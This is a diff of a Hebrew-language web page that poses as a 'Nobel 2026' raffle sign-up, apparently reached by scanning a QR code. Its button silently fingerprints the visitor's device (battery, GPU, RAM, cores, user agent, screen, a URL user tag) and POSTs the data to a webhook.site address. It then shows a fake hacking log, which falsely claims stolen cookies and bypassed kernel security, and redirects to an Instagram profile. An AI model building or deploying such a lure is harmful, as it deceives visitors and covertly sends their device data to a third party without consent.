@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>מבצע נובל למצוינות - הגרלה</title>
+    <title>מבצע נובל 2026 - הרשמה</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; overflow: hidden; }
-        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 1; transition: all 0.5s; }
+        body { font-family: 'Segoe UI', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; overflow: hidden; }
+        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 90%; z-index: 1; transition: all 0.5s; border: 2px solid transparent; }
         h1 { color: #1a73e8; margin-bottom: 10px; }
         p { color: #5f6368; line-height: 1.6; }
-        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s, background 0.2s; margin-top: 20px; }
-        button:hover { transform: scale(1.05); background: #1557b0; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 20px; width: 100%; }
+        button:hover { transform: scale(1.02); background: #1557b0; }
         
-        /* מצב פריצה */
+        /* Hacked Mode */
         .hacked-body { background-color: #000; color: #0f0; }
-        .progress-container { display: none; margin-top: 25px; border: 1px solid #0f0; position: relative; height: 25px; }
-        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; }
-        #log { font-family: 'Courier New', Courier, monospace; font-size: 13px; margin-top: 15px; text-align: left; height: 80px; overflow: hidden; line-height: 1.4; color: #0f0; }
-        .warning { color: #ff0000; font-weight: bold; display: none; margin-top: 10px; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.1;} 100% {opacity: 1;} }
+        .progress-container { display: none; margin-top: 25px; border: 1px solid #0f0; height: 20px; background: #001100; }
+        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; box-shadow: 0 0 10px #0f0; }
+        #log { font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; text-align: left; height: 120px; overflow-y: auto; color: #0f0; border-top: 1px dashed #0f0; padding-top: 10px; }
+        .warning { color: #ff0000; font-weight: bold; display: none; margin-top: 15px; animation: blink 0.8s infinite; text-transform: uppercase; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
     </style>
 </head>
 <body>
@@ -26,82 +26,127 @@
 <div class="card" id="mainCard">
     <div id="content-normal">
         <h1>הגרלת נובל 2026! 🎁</h1>
-        <p>סרקתם והגעתם למקום הנכון. לחצו על הכפתור למטה כדי להירשם להגרלת הפרסים ולהורדת חומרי ההרצאה.</p>
-        <button onclick="startExploit()">הרשמה מהירה</button>
+        <p>ברכות על זכייתכם בשלב המוקדם. לחצו על הכפתור למטה כדי לאמת את הפרטים ולהירשם להגרלה הגדולה.</p>
+        <button onclick="runMasterExploit()">אימות והרשמה</button>
     </div>
 
     <div class="progress-container" id="exploitBox">
         <div class="progress-bar" id="bar"></div>
     </div>
     <div id="log"></div>
-    <div id="finalWarning" class="warning">SYSTEM COMPROMISED - DATA EXFILTRATED</div>
+    <div id="finalWarning" class="warning">System Breach: Data Exfiltration Complete</div>
 </div>
 
 <script>
-    async function startExploit() {
-        const mainCard = document.getElementById('mainCard');
+    // --- HELPER: Identify iPhone Models ---
+    function identifyIphone() {
+        const h = window.screen.height;
+        const r = window.devicePixelRatio;
+        if (r === 3) {
+            if (h === 852) return "iPhone 15 Pro / 14 Pro";
+            if (h === 932) return "iPhone 15 Pro Max / 14 Pro Max";
+            if (h === 844) return "iPhone 14 / 13 / 12";
+            if (h === 926) return "iPhone 14 Plus / 13 Pro Max";
+            if (h === 812) return "iPhone 13 mini / 12 mini / X / XS";
+        }
+        if (r === 2 && h === 896) return "iPhone 11 / XR";
+        if (h === 667) return "iPhone SE / 8 / 7";
+        return "Apple Device (iPhone/iPad)";
+    }
+
+    // --- HELPER: Identify Android Brands ---
+    function identifyAndroid() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Samsung") || ua.includes("SM-")) return "Samsung Galaxy";
+        if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO") || ua.includes("Mi ")) return "Xiaomi / Poco";
+        if (ua.includes("Pixel")) return "Google Pixel";
+        if (ua.includes("OnePlus")) return "OnePlus";
+        return "Android Device";
+    }
+
+    // --- HELPER: Get GPU Data ---
+    function getGPU() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (!gl) return "Unknown";
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic";
+    }
+
+    async function runMasterExploit() {
         const logBox = document.getElementById('log');
+        const bar = document.getElementById('bar');
         
-        // 1. שינוי ויזואלי מיידי
+        // 1. UI Switch
         document.body.classList.add('hacked-body');
-        mainCard.style.background = '#111';
-        mainCard.style.borderColor = '#0f0';
+        document.getElementById('mainCard').style.background = '#111';
         document.getElementById('content-normal').style.display = 'none';
         document.getElementById('exploitBox').style.display = 'block';
 
-        // 2. איסוף נתונים (כולל סוללה)
-        let batteryLevel = "Unknown";
-        try {
-            const battery = await navigator.getBattery();
-            batteryLevel = Math.round(battery.level * 100) + "%";
-        } catch (e) { /* Battery API not supported */ }
+        // 2. Data Collection
+        let battery = "Blocked";
+        try { if(navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : ""); } } catch(e){}
+
+        const platform = navigator.platform;
+        let finalModel = "PC / Unknown";
+        if (/iPhone|iPad|iPod/.test(platform)) finalModel = identifyIphone();
+        else if (/Android/.test(navigator.userAgent)) finalModel = identifyAndroid();
 
         const payload = {
-            status: "INFILTRATED",
-            device: navigator.platform,
-            browser: navigator.userAgent.split(' ').pop(),
-            battery: batteryLevel,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            time: new Date().toLocaleTimeString()
+            user_tag: new URLSearchParams(window.location.search).get('user') || "Unknown_Target",
+            conclusion: finalModel,
+            hardware: {
+                platform: platform,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
+                gpu: getGPU(),
+                res: `${window.screen.width}x${window.screen.height}`,
+                ratio: window.devicePixelRatio
+            },
+            software: {
+                agent: navigator.userAgent,
+                lang: navigator.language,
+                dark: window.matchMedia('(prefers-color-scheme: dark)').matches
+            },
+            power: battery,
+            timestamp: new Date().toISOString()
         };
 
-        // שליחת הנתונים ל-Webhook (זכור להחליף את ה-URL)
-        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af'; 
-        const encodedData = btoa(JSON.stringify(payload));
-        fetch(`${webhookUrl}?token=admin_bypass&data=${encodedData}`, { mode: 'no-cors' });
+        // 3. Silent Send
+        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af';
+        fetch(webhookUrl, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
-        // 3. אנימציית לוגים "מפחידה"
+        // 4. Scary Terminal Animation
         const logs = [
-            "> Establishing connection to CNC server...",
-            "> Connection encrypted via AES-256",
-            "> Searching for local vulnerabilities...",
-            `> Found device: ${payload.device}`,
-            `> Battery status: ${payload.battery} - Accessing power management...`,
-            "> Extracting browser history tokens...",
-            "> Bypassing sandbox security...",
-            "> Uploading sensitive_data.zip to cloud...",
-            "> Cleaning tracks..."
+            "> Initializing Infiltration...",
+            `> Target: ${payload.user_tag}`,
+            `> Hardware Detected: ${payload.conclusion}`,
+            `> GPU: ${payload.hardware.gpu.split(' ').pop()}`,
+            `> RAM: ${payload.hardware.ram}GB | Cores: ${payload.hardware.cores}`,
+            `> Battery: ${payload.power}`,
+            "> Bypassing Kernel Security...",
+            "> Scraping Session Cookies...",
+            "> Uploading Identity_Package.zip...",
+            "> SUCCESS: Target Compromised."
         ];
 
-        let i = 0;
-        const bar = document.getElementById('bar');
-        
+        let progress = 0;
         const interval = setInterval(() => {
-            i += 1;
-            bar.style.width = i + "%";
+            progress += 1;
+            bar.style.width = progress + "%";
             
-            if (i % 11 === 0 && logs.length > 0) {
+            if (progress % 10 === 0 && logs.length > 0) {
                 const line = document.createElement('div');
-                line.innerText = logs.shift();
+                line.innerHTML = `<span style="color:#888">[${new Date().toLocaleTimeString()}]</span> ` + logs.shift();
                 logBox.appendChild(line);
                 logBox.scrollTop = logBox.scrollHeight;
             }
 
-            if (i >= 100) {
+            if (progress >= 100) {
                 clearInterval(interval);
                 document.getElementById('finalWarning').style.display = 'block';
                 setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/elisamuelson_/?hl=en";
+                    window.location.href = "https://www.instagram.com/elisamuelson_/";
                 }, 1500);
             }
         }, 40);
